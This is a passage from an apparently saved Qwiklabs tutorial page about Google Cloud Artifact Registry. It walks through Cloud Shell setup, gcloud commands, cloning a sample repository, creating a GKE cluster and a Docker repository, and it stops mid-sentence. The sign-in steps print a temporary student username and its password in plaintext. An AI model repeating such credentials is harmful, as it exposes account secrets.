id='lab---working-with-artifact-registry'><span>LAB - Working with Artifact Registry</span></h2><h2 id='overview-39'><span>Overview</span></h2><p><span>As the evolution of Container Registry, </span><a href='https://cloud.google.com/artifact-registry'><span>Artifact Registry</span></a><span> is a single place for your organization to manage container images and language packages (such as Maven and npm). It is fully integrated with Google Cloud&#39;s tooling and runtimes and comes with support for native artifact protocols. This makes it simple to integrate it with your CI/CD tooling to set up automated pipelines.</span></p><p><span>In this lab you will learn about some of the features available in Artifact Registry.</span></p><h2 id='objectives-27'><span>Objectives</span></h2><p><span>In this lab, you learn how to:</span></p><ul><li><p><span>Create repositories for Containers and Language Packages</span></p></li><li><p><span>Manage container images with Artifact Registry</span></p></li><li><p><span>Integrate Artifact Registry with Cloud Code</span></p></li><li><p><span>Configure Maven to use Artifact Registry for Java Dependencies</span></p></li></ul><h2 id='setup-and-requirement'><span>Setup and requirement</span></h2><h3 id='before-you-click-the-start-lab-button-23'><span>Before you click the Start Lab button</span></h3><p><span>Read these instructions. Labs are timed and you cannot pause them. The timer, which starts when you click </span><strong><span>Start Lab</span></strong><span>, shows how long Google Cloud resources are made available to you.</span></p><p><span>This hands-on lab lets you do the lab activities in a real cloud environment, not in a simulation or demo environment. It does so by giving you new, temporary credentials you use to sign in and access Google Cloud for the duration of the lab.</span></p><p><span>To complete this lab, you need:</span></p><ul><li><p><span>Access to a standard internet browser (Chrome browser recommended).</span></p></li></ul><p><strong><span>Note:</span></strong><span> Use an Incognito (recommended) or private browser window to run this lab. This prevents conflicts between your personal account and the student account, which may cause extra charges incurred to your personal account.</span></p><ul><li><p><span>Time to complete the lab—remember, once you start, you cannot pause a lab.</span></p></li></ul><p><strong><span>Note:</span></strong><span> Use only the student account for this lab. If you use a different Google Cloud account, you may incur charges to that account.</span></p><h3 id='how-to-start-your-lab-and-sign-in-to-the-google-cloud-console-17'><span>How to start your lab and sign in to the Google Cloud console</span></h3><ol start='' ><li><p><span>Click the </span><strong><span>Start Lab</span></strong><span> button. If you need to pay for the lab, a dialog opens for you to select your payment method. On the left is the Lab Details pane with the following:</span></p><ul><li><p><span>The Open Google Cloud console button</span></p></li><li><p><span>Time remaining</span></p></li><li><p><span>The temporary credentials that you must use for this lab</span></p></li><li><p><span>Other information, if needed, to step through this lab</span></p></li></ul></li><li><p><span>Click </span><strong><span>Open Google Cloud console</span></strong><span> (or right-click and select </span><strong><span>Open Link in Incognito Window</span></strong><span> if you are running the Chrome browser).</span></p><p><span>The lab spins up resources, and then opens another tab that shows the Sign in page.</span></p><p><span>*</span><strong><span>Tip:</span><span>*</span></strong><span> Arrange the tabs in separate windows, side-by-side.</span></p><p><strong><span>Note:</span></strong><span> If you see the </span><strong><span>Choose an account</span></strong><span> dialog, click </span><strong><span>Use Another Account</span></strong><span>.</span></p></li><li><p><span>If necessary, copy the </span><strong><span>Username</span></strong><span> below and paste it into the </span><strong><span>Sign in</span></strong><span> dialog.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">student-02-4d9ed7863142@qwiklabs.net</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You can also find the Username in the Lab Details pane.</span></p></li><li><p><span>Click </span><strong><span>Next</span></strong><span>.</span></p></li><li><p><span>Copy the </span><strong><span>Password</span></strong><span> below and paste it into the </span><strong><span>Welcome</span></strong><span> dialog.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">nPhedPImkx6C</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You can also find the Password in the Lab Details pane.</span></p></li><li><p><span>Click </span><strong><span>Next</span></strong><span>.</span></p><p><strong><span>Important:</span></strong><span> You must use the credentials the lab provides you. Do not use your Google Cloud account credentials.</span></p><p><strong><span>Note:</span></strong><span> Using your own Google Cloud account for this lab may incur extra charges.</span></p></li><li><p><span>Click through the subsequent pages:</span></p><ul><li><p><span>Accept the terms and conditions.</span></p></li><li><p><span>Do not add recovery options or two-factor authentication (because this is a temporary account).</span></p></li><li><p><span>Do not sign up for free trials.</span></p></li></ul></li></ol><p><span>After a few moments, the Google Cloud console opens in this tab.</span></p><p><strong><span>Note:</span></strong><span> To access Google Cloud products and services, click the </span><strong><span>Navigation menu</span></strong><span> or type the service or product name in the </span><strong><span>Search</span></strong><span> field. </span><img src="images\9Fk8NYFp3quE9mF%2FilWF6%2FlXY9OUBi3UWtb2Ne4uXNU%3D" referrerpolicy="no-referrer" alt="Navigation menu icon and Search field"></p><h3 id='activate-cloud-shell-9'><span>Activate Cloud Shell</span></h3><p><span>Cloud Shell is a virtual machine that is loaded with development tools. It offers a persistent 5GB home directory and runs on the Google Cloud. Cloud Shell provides command-line access to your Google Cloud resources.</span></p><ol start='' ><li><p><span>Click </span><strong><span>Activate Cloud Shell</span></strong><span> </span><img src="https://cdn.qwiklabs.com/ep8HmqYGdD%2FkUncAAYpV47OYoHwC8%2Bg0WK%2F8sidHquE%3D" referrerpolicy="no-referrer" alt="Activate Cloud Shell icon"><span> at the top of the Google Cloud console.</span></p></li><li><p><span>Click through the following windows:</span></p><ul><li><p><span>Continue through the Cloud Shell information window.</span></p></li><li><p><span>Authorize Cloud Shell to use your credentials to make Google Cloud API calls.</span></p></li></ul></li></ol><p><span>When you are connected, you are already authenticated, and the project is set to your </span><strong><span>Project_ID</span></strong><span>, </span><code>qwiklabs-gcp-04-21a41c4e5c02</code><span>. The output contains a line that declares the </span><strong><span>Project_ID</span></strong><span> for this session:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Your Cloud Platform project in this session is set to qwiklabs-gcp-04-21a41c4e5c02</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><code>gcloud</code><span> is the command-line tool for Google Cloud. It comes pre-installed on Cloud Shell and supports tab-completion.</span></p><ol start='' ><li><p><span>(Optional) You can list the active account name with this command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud auth list</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Click </span><strong><span>Authorize</span></strong><span>.</span></p></li></ol><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ACTIVE: *</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ACCOUNT: student-02-4d9ed7863142@qwiklabs.net</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">To set the active account, run:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  $ gcloud config set account `ACCOUNT`</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 113px;"></div><div class="CodeMirror-gutters" style="display: none; height: 113px;"></div></div></div></pre><ol start='' ><li><p><span>(Optional) You can list the project ID with this command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud config list project</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[core]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">project = qwiklabs-gcp-04-21a41c4e5c02</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><strong><span>Note:</span></strong><span> For full documentation of </span><code>gcloud</code><span>, in Google Cloud, refer to </span><a href='https://cloud.google.com/sdk/gcloud'><span>the gcloud CLI overview guide</span></a><span>.</span></p><p><span>You must wait for the lab to provision before making any changes to the environment! The pre-configured parts of the environment that you need to work with will be available to you as soon as the lab indicates it is ready.</span></p><h2 id='task-1-prepare-the-lab-environment'><span>Task 1. Prepare the lab environment</span></h2><h3 id='set-up-variables'><span>Set up variables</span></h3><ul><li><p><span>In Cloud Shell, set your project ID and project number. Save them as </span><code>PROJECT_ID</code><span> and </span><code>PROJECT_NUMBER</code><span> variables:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">export PROJECT_ID=$(gcloud config get-value project)</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">export PROJECT_NUMBER=$(gcloud projects describe $PROJECT_ID --format='value(projectNumber)')</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">export REGION=us-east1</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud config set compute/region $REGION</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 90px;"></div><div class="CodeMirror-gutters" style="display: none; height: 90px;"></div></div></div></pre><p><span>Copied!</span></p><h3 id='enable-google-services'><span>Enable Google services</span></h3><ul><li><p><span>Run the following to enable necessary Google services:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud services enable \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  cloudresourcemanager.googleapis.com \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  container.googleapis.com \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  artifactregistry.googleapis.com \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  containerregistry.googleapis.com \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  containerscanning.googleapis.com</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 135px;"></div><div class="CodeMirror-gutters" style="display: none; height: 135px;"></div></div></div></pre><p><span>Copied!</span></p><h3 id='get-the-source-code'><span>Get the source code</span></h3><p><span>The source code for this lab is located in the GoogleCloudPlatform org on GitHub.</span></p><ul><li><p><span>Clone the source code with the command below, then change into the directory.</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">git clone https://github.com/GoogleCloudPlatform/cloud-code-samples/</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">cd ~/cloud-code-samples</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><h3 id='provision-the-infrastructure-used-in-this-lab'><span>Provision the infrastructure used in this lab</span></h3><p><span>In this lab you will deploy code to Kubernetes Engine (GKE).</span></p><ul><li><p><span>Run the setup script below to prepare this infrastructure:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud container clusters create container-dev-cluster --zone=us-east1-b</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify the objective.</span></p><p><span>Enable Google Services and create GKE cluster</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h2 id='task-2-working-with-container-images'><span>Task 2. Working with container images</span></h2><h3 id='create-a-docker-repository-on-artifact-registry'><span>Create a Docker Repository on Artifact registry</span></h3><p><span>Artifact Registry supports managing container images and language packages. Different artifact types require different specifications. For example, the requests for Maven dependencies are different from requests for Node dependencies.</span></p><p><span>To support the different API specifications, Artifact Registry needs to know what format you want the API responses to follow. To do this you will create a repository and pass in the </span><code>--repository-format</code><span> flag indicating the type of repository desired.</span></p><ol start='' ><li><p><span>From Cloud Shell run the following command to create a repository for Docker images:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud artifacts repositories create container-dev-repo --repository-format=docker \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  --location=$REGION \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  --description="Docker repository for Container Dev Workshop"</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Click </span><strong><span>Authorize</span></strong><span> if the Cloud Shell authorization prompt appears.</span></p><ol start='' ><li><p><span>In the Cloud console, go to </span><strong><span>Artifact Registry</span></strong><span> &gt; </span><strong><span>Repositories</span></strong><span> and notice your newly created Docker repository named </span><code>container-dev-repo</code><span>. If you click on it you can see that it&#39;s empty at the moment.</span></p></li></ol><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify the objective. (It may take a minute to validate. If you have completed successfully and it is not validating, wait a minute and try again.)</span></p><p><span>Working with container images</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h3 id='configure-docker-authentication-to-artifact-registry'><span>Configure Docker Authentication to Artifact Registry</span></h3><p><span>When connecting to Artifact Registry credentials are required in order to provide access. Rather than set up separate 